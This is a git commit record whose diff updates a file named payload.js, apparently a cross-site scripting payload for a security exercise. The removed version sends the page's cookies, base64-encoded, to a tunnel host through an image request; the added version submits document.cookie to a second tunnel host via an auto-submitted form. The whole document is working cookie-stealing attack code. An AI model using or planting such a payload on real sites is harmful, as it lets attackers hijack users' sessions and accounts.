f2dd1ca6c4721bb9907b13e8d693810a3953347c
JP Verkamp <me@jverkamp.com>
2025-06-26 17:08:15 -0400

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,2 +1,11 @@
-let i = new Image();
-i.src = "https://251337478b55a7.lhr.life/" + btoa(document.cookie);
+let f = document.createElement("form");
+f.action = "https://4dbe7f80952dd7.lhr.life";
+f.method = "GET";
+
+let i = document.createElement("input");
+i.name = "data";
+i.value = document.cookie;
+
+f.appendChild(i);
+document.body.appendChild(f);
+f.submit();
